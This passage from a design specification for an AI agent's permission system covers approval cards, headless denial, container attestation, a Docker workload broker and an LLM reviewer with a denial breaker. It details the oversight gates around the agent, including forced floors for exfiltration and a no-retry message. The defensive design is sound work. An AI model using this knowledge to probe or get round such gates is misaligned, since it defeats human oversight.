that resolve to allow or sandbox-auto can run; only a required human card denies.

For an ordinary write outside the project, the directory approval card also
approves that invocation, avoiding a second category-level card for the same
write. A directory grant never replaces a later mandatory floor.
Choosing the lasting folder grant adds it to configured `additionalDirectories`
and therefore to the project roots. The card explains that eligible later file
writes there no longer ask in default and auto-review modes; mandatory floors
and checkpoint eligibility still apply.

Path-scoped remembered approvals for builtin `write_file`, `edit_file`,
`multi_edit` and `apply_patch` share one text-write identity. The approval card
names all four operations for a single-path scope. A single-path patch that
creates or edits a file shares that file's scope; a patch containing a deletion
has a separate memory identity and cannot reuse a text-edit approval. A
multi-path patch retains a tool-specific identity bound to
the exact sorted set of touched paths. Its card names only `apply_patch`. Other sources
and other tools retain their own memory identities. Reuse still requires the
existing risk check and re-prompts on escalation.

Ordinary secret reads, including `.env`, `.env.local` and `.env.production`,
use the mode/rule decision; secret writes follow ordinary file-write rules.
Host encryption keys, credential databases and cookie/token stores remain
admission-denied because raw access bypasses the host credential-use protocol. The exact template names `.env.example`, `.env.sample`,
`.env.template` and `.env.dist` are excluded from the environment-file
sensitive set for reads and writes; other sensitive rules still apply. Existing
read-before-write observation and unchanged-since-read hash checks remain
mandatory. A stale observation instructs the agent to re-read the file.

For confined shell invocations, unproven or destructive evidence uses the ordinary mode/human route unless it establishes a forced floor from the decision tree. Critical deletion, project escape, exfiltration and protected control paths remain forced one-shot requests, without reviewer or remembered-grant reuse. Host or escalated execution uses the ordinary mode/human route and may offer prefix rules.

## Foreground And Headless Behavior

Foreground requests use the bottom-floating, non-modal approval dock. The host binds the answer to the exact live request, registered app surface and principal. Normal cards offer once/session/always/folder/prefix choices only where the request permits them. Forced cards offer this invocation only.

An owner-away turn with an app approval surface is not headless. Its card waits without a timeout by default. `permissions.ownerAwayAutoSkipMinutes` is a nonnegative integer: `0` means unlimited; a configured positive value denies the unanswered request after that many minutes. Skip is never approval.

True headless execution has no human approver. In auto mode ordinary requests reach the reviewer first; only fallback to a human card denies. Forced one-shot requests deny without reviewer dispatch. A no-approver or configured auto-skip denial tells the model: **Nobody can approve this request; do not retry.** Host-created turn provenance remains unforgeable and cannot be inherited by a later remote turn.

There is no deferred approval queue. Recently denied stores bounded, DLP-redacted summaries, never raw executable arguments or grants. Legacy `deferred-queue.jsonl` does not authorize anything. A reconstructable entry can be manually rerun with the user as approver: it starts admission again and requires a fresh card, skipping remembered approvals and reviewer automation. Bounded live callbacks are one-use and do not survive restart. A persisted non-executable reference may instead resolve the original call from its existing saved transcript after restart; the denial record stores only tool-use identity and input/root digests, not a second copy of executable arguments. The [replay resolver](../../src/permissions/reviewer/recently-denied-replay.ts) requires one matching call, unchanged project-root identity and input digest, matching tool/source/provider identity, and validation against the current tool schema without coercion. Missing, ambiguous, changed or invalid references make rerun unavailable. A stored denial or digest never becomes permission.

Cancellation and host-owned expiry remain distinct from a human refusal. Approval outcome reasons propagate to tool/directory results and audit; changing approval waiting does not change execution ceilings.

### Headless operator container attestation

A Linux one-shot launch may name an operator-produced attestation with
`--exec-operator-attestation=<absolute-path>`. An explicit attestation is
verified before the service graph, model connection, or installed plugins
start. Absence preserves the ordinary headless behavior. The option is invalid
without `--exec`, with `--set-secret`, or on a non-Linux host.

The JSON document is limited to 64 KiB, rejects duplicate and unknown members,
and has these exact top-level fields: `version`, `audience`, `keyId`,
`issuedAt`, `notBefore`, `expiresAt`, `claims`, and `signature`. Version is
`ave-operator-container-attestation/v1`; audience is `ave-headless-exec`.
The host opens one regular-file descriptor and bounds the read to 64 KiB plus
one rejection byte, so a metadata race cannot cause an unbounded read. The
validity window is at most five minutes. `signature` is an Ed25519 signature
over the canonical JSON encoding of the other seven fields: object keys are
sorted recursively by UTF-16 code units, arrays retain their input order,
strings and the schema's safe integers use `JSON.stringify` encoding, and the
result is signed as UTF-8 bytes.

`keyId` selects only
`/etc/ave/operator-trust.d/<keyId>.pub`. The document cannot carry a public
key. The trust directory must resolve to that fixed canonical path, be owned by
root, exclude group and other writes, and reside on a read-only mount. The host
opens the directory and PEM public-key file without following their final path
components, resolves the opened descriptors through `/proc/self/fd`, and
requires both descriptors to identify the same read-only mount. It obtains
metadata and bytes from that one opened key descriptor. The key must resolve
within the directory, be root-owned, have no write bits, and contain an Ed25519
public key. Tests may inject a different root into the non-authoritative
verifier, but the production issuer cannot select one from the command line or
environment.

The signed `claims` object contains exact fields for:

- operator-established `disposable`, `noHostMounts`, `noHostNamespaces`, and
  `noInheritedSecrets` assertions, all set to true;
- the current mount, PID, network, IPC, UTS, cgroup, and user namespace links;
- the cgroup v2 membership path and finite `memory.max`, `pids.max`, and
  `cpu.max` values, read through descriptors on one read-only cgroup v2 mount;
- a normalized mount-info digest and normalized root-mount tuple;
- the boot ID, PID, and `/proc/self/stat` start-time ticks;
- the normalized `uid_map` and `gid_map`, each fixed to the full host identity
  mapping `0 0 4294967295`;
- all four real/effective/saved/filesystem user IDs plus `NoNewPrivs`, `Seccomp`,
  `CapInh`, `CapPrm`, `CapEff`, `CapBnd`, and `CapAmb` from `/proc/self/status`.

The verifier reads those facts from the current process and requires an exact
match after signature verification. `NoNewPrivs=1`, seccomp filter mode,
non-root real, effective, saved, and filesystem user IDs, full host identity
maps, and finite resource limits are mandatory. Every signed capability set
must exclude
`CHOWN`, `DAC_OVERRIDE`, `FOWNER`, `SETGID`, `SETUID`, `SYS_ADMIN`,
`SYS_PTRACE`, `SYS_MODULE`, `SYS_RAWIO`, `NET_ADMIN`, `BPF`, `PERFMON`, and
`CHECKPOINT_RESTORE`; other signed bits remain visible to later policy rather
than being rejected implicitly. The membership path is interpreted relative to
the cgroup namespace root; the host does not compare it with mountinfo's
host-relative cgroup root. It opens the membership directory and each limit
file, then rejects any descriptor whose mount ID differs from the selected
cgroup v2 mount or whose kernel filesystem type is not cgroup v2.

The verifier resolves `/proc/self` once to `/proc/<pid>` and uses only that
numeric path for process observations. The process files `mountinfo`, `cgroup`,
`status`, `stat`, `uid_map`, and `gid_map` must be opened on the procfs mount
covering that numeric directory; namespace and `fdinfo` paths must use that same
mount rather than a nested proc bind. Independent `statfs` checks require the
kernel's procfs magic before mount-table contents are trusted. The boot ID may
reside on another procfs submount. These checks and the host identity maps stop
an unprivileged user namespace from substituting a namespace-local UID-0 trust
root. A privileged host administrator remains inside the operator trust
boundary. The signed mount digest exposes the remaining procfs view to the
operator.

The signer must run outside the attested process's namespaces, keep its private
key unavailable to the process, and observe the exact target PID from the host
side after creation. It must independently establish the no-host-mounts,
no-host-namespaces, no-inherited-secrets, disposable-lifecycle, and limit
claims. The signer also owns termination and disposal enforcement. The host
verifier cannot derive those host-relative properties from inside the
container.

Successful production verification issues a frozen, host-owned capability
tracked by weak identity. Injectable verification used by tests returns only
inert evidence and cannot invoke the private capability issuer. Public and
audit projections contain only an ID, generation, expiry, fingerprints, the
four boolean isolation assertions, and resource limits. They contain no
signature, public-key bytes, process fields, namespace links, paths, or mount
inventory. The signed v1 expiry remains an authority deadline: production
checks it before publication, at every acquire, again after the asynchronous
process/confinement observation, and synchronously when a one-shot lease is
consumed. Every acquire also re-reads and matches the exact process identity,
namespaces, cgroup, mounts, status and limits. A long-lived operator must obtain
a newly signed attestation; renewal semantics must use an explicit new contract
if they differ from v1. Each
grant-minting acquire returns a nominal lease bound to that exact capability
generation, and execution-grant issuance consumes the lease once. A forged,
replayed, or stale lease cannot mint a grant. Controller termination revokes
the in-memory capability and all leases; attested-process termination changes
the observed process identity and makes the next acquire fail. These lifecycle
events and the signed expiry are the v1 revocation boundaries.
The grant-minting acquire runs after asynchronous PreToolUse hooks, plugin
admission, rate checks, and audit-readiness checks. The handler receives the
grant at the final effect boundary, with no intervening await that could make
the observed confinement stale before dispatch.

The execution router consumes this capability only for builtin shell work in
the same attested Linux one-shot. The capability does not itself authorize a
tool,
skip structural command checks, alter reviewer outcomes, or make a non-attested
process disposable. The v1 profile remains strict: the four isolation claims,
including no host mounts and no inherited secrets, are all mandatory. Workloads
that need a bounded artifact mount or a different capability set require a
separately specified profile/version and cannot weaken v1 by convention.
The benchmark Docker `main` process therefore uses the separate broker contract
below rather than presenting itself as this attested process.

### Terminal permission-audit proof

The native runtime exposes one internal pre-boot command,
`--verify-permission-audit=<challenge>`, for a stopped host. The 64-lowercase-
hex challenge binds a public `ave-permission-audit-proof/v1` receipt to its
collector. The verifier requires explicit absolute `AVE_HOME` and protected
`AVE_SECRET_KEY_FILE` inputs, opens the existing encrypted audit HMAC secret
read-only, and never creates, repairs, or replaces audit authority.

Every permission-audit-looking directory entry must have the canonical
`YYYY-MM-DD.permission-audit.jsonl` name. The verifier stable-opens each
owner-only 0600 regular single-link file, verifies its complete HMAC chain and
the separately stored daily seal for every nonempty file, and rejects directory
or file changes during the read. Success writes exactly one public JSON receipt
with basename/date/SHA-256/byte/entry metadata. Secret material, stored seals,
paths, rows, and entry fields never cross this boundary. `AuditLogger.close()`
stops new permission appends and drains the accepted append tail before this
proof may freeze the files.

The packaged launcher removes the inherited Node preload/module-search and
Node/Electron process-role variables named by
`ave-headless-launch-environment/v1` before starting the runtime. The native
dispatcher reserves bare, malformed, and duplicate proof forms, so none can
fall through into normal host boot. Failure output is one stable public error
code (`invalid-arguments` before verification or `verification-failed` after
it starts); raw filesystem and decryption errors remain inside the process.

### Host-native workload broker

The brokered Linux route keeps the Ave controller, controller profile,
encrypted provider secret, external key, broker credential, receipts and logs
on the host. Harbor's incoming mounts and persistent controller environment are
discarded. Task files and role logs cross later through Docker copy; `main`
receives no host bind, Docker socket, capability file, Unix socket, receipt or
controller environment.

The environment binds the route to exactly one Docker Compose service
`main` container. The published workload identity contains the 64-hex container
ID, `sha256:` image ID, fresh generation, boundary fingerprint, guest cwd and
guest HOME. The broker's host-only binding additionally pins Docker `StartedAt`,
the trial ID and Compose project/service/container-number labels. Startup
rejects effective Compose configuration with host binds,
devices, device rules, `cap_add`, Compose secrets/configs, privileged mode,
host PID/IPC/UTS/network/user namespaces or controller transport environment.
Before every effect, the broker rechecks the exact container and image,
`StartedAt`, labels, running state, no binds or devices, private cgroup
namespace, finite memory/swap/PID limits, `no-new-privileges`, non-host
namespaces and no-restart policy. It also pins the container's cgroup-v2
`memory.events` device/inode and `memory.max`.

The host publishes `ave-workload-broker-capability/v1` only after Docker event
monitoring and identity evidence are live. The document contains the absolute
socket path, a random bearer token of at least 32 bytes, UTC expiry, exact
workload identity, ordered allowed operations and request/response byte limits.
It is one owner-owned mode `0400` regular file in a host-only mode `0700`
control directory. The socket is mode `0600` in a separate owner-owned mode
`0700` directory. Ave rejects symlinks, changed inode metadata, wrong owners or
modes, an unbound socket path, expiry and handshake field/order mismatches before
constructing host services. The capability read holds its real parent directory
open and rechecks both the directory and file path bindings before accepting the
document. It repeats the exact handshake before every operation.

Only host-created builtin Bash and canonical file-tool instances can receive
broker grants. Canonical file operations are `read`, binary read, list, glob,
grep, write, edit, patch, move, copy, extract and delete. Background Bash start,
read and kill retain the same broker capability and session ownership. A plugin
or MCP tool that copies a builtin name or schema is not canonical and receives
no grant. Once broker mode is active, missing or invalid authority returns a
typed broker error and never calls a host shell, host path resolver or local
file implementation.

Foreground and background shell terminals use the closed statuses `exited`,
`signaled`, `timed-out`, `cancelled`, `oom-killed`, `transport-failed` and
`cleanup-unproven`. A terminal result carries exit code, signal, timeout and
cancellation flags, cgroup OOM delta, `ownedResourcesZero` and the hash-chained
receipt digest. `oom-killed` requires an increased cgroup-v2 OOM counter; exit
137 or `SIGKILL` alone is insufficient. Timeout, cancellation, transport
failure or unproven identity triggers fail-closed removal when the broker cannot
otherwise prove the Docker exec is gone. `cleanup-unproven` is the only terminal
status allowed to report `ownedResourcesZero=false`.

The host controller runs under a separate Linux child subreaper. After the turn,
the supervisor terminates and reaps the controller process group and adopted
descendants, and publishes its own zero-resource receipt. Broker release then
stops accepting requests, proves that broker-owned exec handles are zero,
removes the bearer capability and socket, and records `broker_released` while
retaining the exact running `main` container for the shared verifier. If that
proof fails, the broker removes `main` and verification is suppressed. Final
environment teardown force-removes the exact container, proves its absence,
records `cleanup_completed` and `broker_stopped`, and then removes remaining
Compose resources. These receipts validate lifecycle ownership; they do not
claim a benchmark score or task correctness.

## Automated Judge Chain

The [decision tree](permission-decision-tree.md) owns reviewer eligibility and outcome routing. General risk review runs only in global auto mode for ordinary requests that require assessment; protected floors never reach it. User-owned surface Auto instead uses the separate logical-only review described in [surface choices](#user-owned-surface-choices), independently of global mode. LOW/MEDIUM allow. HIGH, unavailable provider, malformed output, timeout or live abort falls back to a normal card; without a human, that fallback denies and includes the no-retry message. A corrupt policy store is an admission denial before review.

The judge settings and transport contract remains in the [judge design](../design/permissions-always-allow-and-judge.md#p2-judge-slot). Configuration and shadow observations cannot override this permission contract. Shadow stages do not grant authority or count breaker denials. Explicit model selections do not silently switch providers; unset reviewer selection follows the active chat model. Invalid settings writes fail before persistence and valid writes preserve unrelated settings, with compare-and-swap rollback on refresh failure. The judge subtree remains user-only configuration under the protected-path floor.

Review requires a host-created invocation identity and conversation/task identity. The host supplies normalized input and host policy facts; external projections are DLP-redacted. Tool results are not review instructions. Audit records the redacted request, final outcome, model, invocation identity, reason and fallback. Review cannot persist a rule. Required audit failures remain terminal.

The breaker counts each successfully completed classifier non-allow assessment once per invocation within the active root turn; errors, aborted assessments and shadow observations do not count: three consecutive denials or twenty total denials send the rest of that turn to normal human cards. An allowed assessment resets only the consecutive count. Human consent does not reopen automation during that turn; a fresh turn resets the breaker. Parent/child identity, settings refresh and shadow observation must not reset or double-count the active turn.

### Approval delivery and execution binding

Only a registered application window's exact main frame can answer its currently delivered card. Subframes, webviews, plugin origins and unrelated app windows cannot mint consent. The explicit approval-owner registry controls delivery through attachment, adoption, detachment and parent links; ownership is never inferred from focus or persisted ancestry. User-driven attachment may transfer delivery. An app renderer remains part of the application's trust level; delivery binding does not defend against a compromised app renderer.

The host verifies native human consent once for the exact request. Rules, peers, parent agents, away automation and remembered approvals are not fresh human consent. Losing an owner never approves a card; owner-away waiting follows the setting above. A forced other-principal request cannot be answered by parent adjudication or away automation.

Immediately before handler entry, a synchronous gate rechecks cancellation, required audit integrity, active-turn breaker state and plugin/remote authority. Returning from a card or renewed route admission re-enters that gate. Permission-request hooks remain block-only and cancellable. Execution retains its existing ceilings and current effect identity.

## Reviewer Failure

Reviewer input separates host-computed policy facts from OS isolation. The host
supplies the existing rule verdict, execution directory, and canonical declared
path checks using the same resolver and containment predicates as the rule
classifier. These facts describe declared operands; they do not attest that a
plugin or custom tool has no other effects. A builtin file operation running
inside the host process has no OS sandbox, but its file-path gates still apply.
Weak isolation or missing conversational purpose preserves the rule floor and
does not alone establish an out-of-scope or destructive write. The model can
still raise risk for additional effects or uncertainty, and the host retains
the maximum of the rule and model verdicts. Reviewer framework changes invalidate
cached verdicts. DLP filtering applies to the policy-fact projection as well as
tool arguments and conversation context.

Reviewer failure is not a silent allow. If the provider is missing, times out, or
returns malformed output, the host fails closed:

- foreground calls ask the user with explicit reviewer-unavailable context;
- headless calls deny only after review falls back to a human card, with no-retry guidance;
- audit records include the reviewer failure path.

A windowless host reports `authorization-required` only after a completed
policy outcome actually needs human consent. Missing reviewer wiring, timeout,
malformed output, and provider failure remain ordinary failed assessments;
exit `77` does not claim that approval can repair them.

An unavailable or failed assessment does not prevent the user from remembering
an ordinary request. The approval gate derives `persistentAllowAllowed` from
host-owned request context and typed reviewer outcomes. The dispatcher issues
exact-input-bound evidence from its existing raw-input rule trace; the gate
uses this evidence without reclassifying display data. A conservative HIGH
display during assessment failure is separate from a completed HIGH judgment.
Completed HIGH judgments, changed sandbox state and mandatory one-shot requests
retain their restrictions, including forced other-principal requests
and sealed rationale approvals.

“Always allow” stores the exact tool, canonical arguments, source, trust origin
and invocation working-directory identity. Existing tool-specific identity and
the host shell's sealed execution plan remain part of the key. The versioned
directory scope prevents reuse across projects. Older unscoped allows no longer
match scoped requests; existing policy rules and exact denials retain their
identity and precedence. Exact rejections remain independent of cwd. The host
captures the canonical directory before displaying its scope and recording its
frozen identity. The UI does not create a wildcard rule. Recording
requires fresh user intent and a live host approval snapshot. On subsequent
calls, hard denies and per-invocation approval requirements still run before the
remembered-decision lookup. Both memory consumers compare current deterministic
risk with the stored reuse ceiling, separately from conservative display risk.

## Plugin And MCP Tools

Plugins and MCP servers use the same path as builtin tools. The tool provider
must declare schemas. Manifest categories are optional provider metadata; the
host derives the effective category per invocation and policy logic remains
host category- and origin-driven.

MCP tools with `readOnlyHint` follow the read lane. Other MCP tools use the
mode/human route and may remember approval per tool. Host capability and manifest
checks remain independent. Each plugin effect enters the same pipeline with its
actual effect identity; a tool-level allow never authorizes unrelated effects.

## Local API Permission Mutation

Local API calls that mutate permission mode route through the approval gate as
agent actions. The renderer-facing reason defaults to English. The gate owns the
final explicitness requirements and denial behavior.

## Audit Requirements

Audit records should include:

- tool name and source;
- category and permission mode;
- trust origin;
- project identity when available;
- decision and decision reason;
- reviewer verdict or reviewer failure state;
- recently denied summaries and manual rerun availability.

Audit records must not contain raw secrets or unnecessary private payload data.

## Test Coverage

The permission scenario board and unit tests under `src/permissions/__tests__`
encode the expected behavior for default, strict, auto-review, reviewer
failures, invalid plugin manifests, MCP tools, overlay prompt imports, and
headless review-first denial and no-retry behavior.

Judge coverage must include the real foreground and headless dispatch lanes,
trace/cancellation and failure parity, both block thresholds and resume on human
approval, chain escalation, settings/model validation,
the settings write floor, active-turn breaker sharing and recently denied routing.
Module or mocked-classifier tests alone do not prove dispatch parity, Settings
interaction or live-provider behavior; those require their own observed checks.
